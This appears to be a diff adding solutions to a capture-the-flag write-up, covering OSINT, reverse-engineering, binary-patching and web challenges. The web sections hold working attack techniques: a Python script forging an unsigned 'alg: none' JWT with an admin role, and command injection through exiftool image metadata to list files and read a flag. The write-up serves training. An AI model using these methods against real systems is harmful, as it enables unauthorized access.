@@ -360,19 +360,20 @@ The flag is clear now.
 
 **solution** : This one, as described we need to recognise the plane, if you do you can build the flag.
 
-So searching about the given plane will lead you to this awesome website of a photographer that has collected tails of several planes.
-[Website](https://airlinersgallery.smugmug.com/Airline-Tails/Airline-Tails)
+So searching about the given plane will lead you to this awesome website of a photographer that has collected tails of several planes. [Website](https://airlinersgallery.smugmug.com/Airline-Tails/Airline-Tails).
 
 So from this website you can conclude that the airline we are looking for is Croatia Airlines.
-
-So a small search about this plane and the needed values in the flag you'll get INSEC{croatiaairlines,inc._ou_831_europe}.
+A small search about this plane and the needed values in the flag you'll get ```INSEC{croatiaairlines,inc._ou_831_europe}```.
 
 ## MyCastle-3
-**description** : 
+**description** : I used to travel a lot but this place is my favorite, Can you find the three words location from where i'm standing.
+```Useful``` https://what3words.com/, Ex flag = INSEC{castle.break.lost}
 
-**given files** :
+**given files** : chall.png
 
-**solution** : 
+**solution** : In this last challenge we are given an image of the moai in the Easter island, So we can recognize that the given statue is a part of ```Ahu Tongariki```. So searching on the given 3 words website, you can try all possible combinations from where the image was taken and get the flag ```INSEC{disadvantages.workout.expands}```.
+<img src="/favicon/chall11.png" alt="Back Image" style="width: 100vw;  object-fit: cover;">
+
 
 # Misc
 ## Suspect-Net-007
@@ -427,16 +428,296 @@ for j in range(len(parts)):
 
 # Reverse Enginnering
 ## e_asm
-**description** : 
+**description** : Some basic ASSEMBLY as a warmup.
 
-**given files** : 
+**given files** : chall
 
-**solution** : 
+**solution** :
 
+```python
+import struct
+flag = list(b"INSEC{") + [0] * 12 + [ord('}'), 0]
+flag[6:10] = struct.pack("<I", 1870225259)  # 4 bytes
+eax = 3738091242
+eax = ((eax >> 1) | (eax << 31)) & 0xFFFFFFFF  # ror eax, 1
+flag[10:14] = struct.pack("<I", eax)
+eax = 2342557323
+eax = eax ^ 0xFFFFFFFF  # XOR with 0xFFFFFFFF
+eax = struct.unpack("<I", struct.pack(">I", eax))[0]  # BSWAP
+flag[14:18] = struct.pack("<I", eax)
+flag_bytes = b''.join([bytes([x]) if isinstance(x, int) else x for x in flag])
+flag_str = flag_bytes.decode("latin-1").strip('\x00')
+
+print(f"Recovered flag: {flag_str}")
+```
 
 ## MajoorCost
-**description** : 
+**description** : Lets find whether you can beat my bin to find the right two numbers. Just Remember to return from the function and use nops to fill in any gaps. INSEC{uppercase hex values of the 5 bytes necessary to win it}
 
-**given files** :
+**given files** : major.exe
 
 **solution** : 
+YOU MAY RECOGNISE that the given file is a 32 bit c++ binary (windows). Use IDA or Cutter.
+
+```cpp
+int main()
+{
+  int num;
+  LPVOID lpAddress;
+  DWORD flOldProtect;
+  int savedregs;
+
+  flOldProtect = 0;
+  lpAddress = &write_here;
+  VirtualProtect(&write_here, 8u, 0x40u, &flOldProtect);
+  scanf("%d %d", lpAddress, lpAddress + 4);     // write 2 numbers to `write_here` location
+  num = 1;
+  check_stack(&savedregs, &tmp_pptr);
+  return 0;
+}
+```
+
+The place of ```write_here``` is part of main function so jumping to it will give us a ```scanf``` call. 
+
+```
+.text:0045D22B 51                                   push    ecx
+.text:0045D22C 68 68 DE 50 00                       push    offset format   ; "%d %d"
+.text:0045D231 E8 1E C6 FF FF                       call    scanf
+.text:0045D231
+.text:0045D236 83 C4 0C                             add     esp, 0Ch
+.text:0045D236
+.text:0045D239
+.text:0045D239                      write_here:                             ; DATA XREF: main+2F↑o
+.text:0045D239 C7 45 DC 06 00 00 00                 mov     [ebp+num], 6
+.text:0045D240 BB C3 08 00 00                       mov     ebx, 8C3h
+```
+
+As you see we need to enter 8 bytes winner code, Then you can recognise the "Congratulations" in strings, and by xrefs get to function ```sub_45D0B0```
+
+```
+.text:0045D0D0 6A 00                                push    0               ; uType
+.text:0045D0D2 68 50 DE 50 00                       push    offset Caption  ; "Win"
+.text:0045D0D7 68 54 DE 50 00                       push    offset Text     ; "Congratulations"
+.text:0045D0DC 6A 00                                push    0               ; hWnd
+.text:0045D0DE FF 15 BC 71 53 00                    call    ds:__imp_MessageBoxA
+```
+
+So we need to call ```sub_45D0B0``` function in the way that program doesn't crash.
+We can do something like this by filling nops as I gives you in the description of the challenge.
+
+```
+E8 72 FE FF FF        call sub_45D0B0
+90                    nop                   ; use nops to fill in any gaps
+90                    nop                   ; use nops to fill in any gaps
+BB                    db BBh                ; do not change the byte, so as it didn't crash
+```
+
+We need to enter 2 numbers: 4294865640(0xFFFE72E8) and 3146813695(0xBB9090FF) ==> Win
+Sum of this num is hex(0xFFFE72E8+0xBB9090FF) = 1BB8F03E7
+Flag is INSEC{1BB8F03E7}
+
+
+# WEB
+
+The challenges in this categorie is made by WisePoo, big thanks to him.
+
+## CyberVault API Gateway - APISA challenge
+
+### Challenge Overview
+The challenge presents a web application with an API gateway that uses JWT (JSON Web Tokens) for authentication. The goal is to retrieve a flag by making a specific API request with the correct parameters.
+
+###  Analysis
+
+**Initial Reconnaissance**
+The application has two main endpoints:
+- `/` - Provides a web interface that issues guest JWT tokens
+- `/api/request` - The main API endpoint requiring specific parameters
+
+**Key Vulnerabilities**
+
+- **JWT Header Manipulation**
+The `verify_token()` function has interesting validation requirements for the JWT header. The header must contain specific pirate-themed values and meet certain format requirements.
+
+- **Timestamp XOR Logic**
+There's a specific timestamp validation using XOR operations that must be satisfied for the request to be accepted.
+
+### Exploitation Steps
+
+1. **Craft the JWT Header**
+We need to create a JWT with specific header values that include pirate-themed strings and specific algorithm settings. The header must contain:
+- A "typ" field with a specific pirate HMAC reference
+- An "alg" field set to "none"
+- A "kid" field with a pirate hash reference
+
+2. **Calculate the Correct Timestamp**
+The timestamp must satisfy a specific XOR operation with magic numbers:
+- XOR with 0xCAFEBABE
+- AND with 0xDEADBEEF
+- Result must not be zero
+
+3. **Prepare the JWT Payload**
+The payload must include:
+- Admin role
+- The calculated timestamp
+
+4. **Required Headers**
+The request must include several specific headers:
+- `X-Request-Timestamp`: The calculated timestamp
+- `X-API-Version`: Must be 1.0
+- `Authorization`: Bearer token with our crafted JWT
+- `X-Content-Hash`: SHA256 hash of the sorted JSON body
+- `Content-Type`: application/json
+
+5. **API Request Body**
+The request body must be a JSON object containing:
+- action: "read"
+- resource: "document"
+- options.type: "admin"
+
+### Flag Retrieval
+When all conditions are met correctly, the server responds with the flag in the format `CSD{....}`.
+
+Python script to automate the process:
+
+```python
+    import jwt
+    import time
+    import hashlib
+    import json
+    import requests
+
+    # Target URL
+    BASE_URL = "URL"
+
+    # Find valid timestamp
+    def find_valid_timestamp():
+        current = int(time.time())
+        while not ((current ^ 0xCAFEBABE) & 0xDEADBEEF):
+            current += 1
+        return current
+
+    # Create JWT
+    header = {
+        "typ": "JWT with Why do pirates use HMAC?",
+        "alg": "none",
+        "kid": "What's a pirate's favorite hash?"
+    }
+
+    timestamp = find_valid_timestamp()
+    payload = {
+        "role": "admin",
+        "timestamp": str(timestamp)
+    }
+
+    token = jwt.encode(payload, None, algorithm=None, headers=header)
+
+    # Prepare request body
+    body = {
+        "action": "read",
+        "resource": "document",
+        "options": {
+            "type": "admin"
+        }
+    }
+
+    # Calculate content hash
+    content_hash = hashlib.sha256(json.dumps(body, sort_keys=True).encode()).hexdigest()
+
+    # Prepare headers
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "X-Request-Timestamp": str(timestamp),
+        "X-API-Version": "1.0",
+        "X-Content-Hash": content_hash,
+        "Content-Type": "application/json"
+    }
+
+    # Make the request
+    try:
+        response = requests.post(f"{BASE_URL}api/request", headers=headers, json=body)
+        print("\nResponse Status:", response.status_code)
+        print("Response Body:", response.text)
+    except requests.exceptions.RequestException as e:
+        print(f"Error making request: {e}")
+
+    # Print debug information
+    print("\nDebug Information:")
+    print(f"Token: {token}")
+    print(f"Timestamp: {timestamp}")
+    print(f"Content-Hash: {content_hash}")
+```
+
+## Galaxy CTF Write-up
+
+### Initial Enumeration
+
+1. On the main page, we find a base64 encoded message in the HTML comments:
+
+   ```html
+   <!-- 
+     Lost in space? Perhaps a puzzle will guide you.
+     Solve the puzzle in /img/puzzle.jpg — Black to move.
+     Replace "XX" in this cryptic text with the correct tile: 
+     Q2hlY2sgNDA0LnBocCB5b3UgbWF5IGZpbmQgd2hhdCB5b3UgYXJlIGxvb2tpbmcgZm9yIXX=
+   -->
+   ```
+
+2. We solve the puzzle in `/img/puzzle.jpg` and get `C4` as the solution.
+
+3. Decoding the base64 string:
+   ```
+   Q2hlY2sgNDA0LnBocCB5b3UgbWF5IGZpbmQgd2hhdCB5b3UgYXJlIGxvb2tpbmcgZm9yIC4=
+   ```
+   Decodes to: "Check 404.php you may find what you are looking for!"
+
+4. Visiting 404.php reveals a hint about connecting to the admin center:
+   ```html
+   <!-- 
+   To add "404.php", connect to the admin center.
+   -->
+   ```
+
+5. Directory enumeration reveals `/adminarea/`
+
+### Admin Panel Access
+
+1. At the login page, we find a comment in the source code:
+   ```html
+   <!-- The password is hidden. Check the error page. -->
+   ```
+
+2. By triggering the error page with `?error=true`, we get the password:
+   - Password: `w0rdc0unt123`
+
+3. Using `admin` as username allows access to the admin dashboard.
+
+### File Upload Exploitation
+
+1. In the admin panel, there's a "Mission Logs" section that allows image uploads with the following restrictions:
+   ```html
+   <!-- The application accepts JPG/JPEG/TIFF files only. -->
+   ```
+   We notice that there's an empty description field for each image.
+
+### Getting the Flag
+
+1. Create a malicious JPEG with command injection in its metadata:
+   ```bash
+   exiftool -ImageDescription="ls" image.jpg
+   ```
+   This lists the files in the webapp directory, revealing a binary named `findaas` in the `bin` directory.
+
+2. Use the `findaas` binary to locate the flag file:
+   ```bash
+   exiftool -ImageDescription="echo 'flag' | ./bin/findaas" image.jpg
+   ```
+
+3. Flag location discovered at:
+   `/Space/is/where/existence/takes/shape/flag.txt`
+
+4. Read the flag by creating another image:
+   ```bash
+   exiftool -ImageDescription="cat /Space/is/where/existence/takes/shape/flag.txt" image.jpg
+   ```
+
+5. Flag obtained: `CSD{1nj3ct10n_15_p41nfu1}`
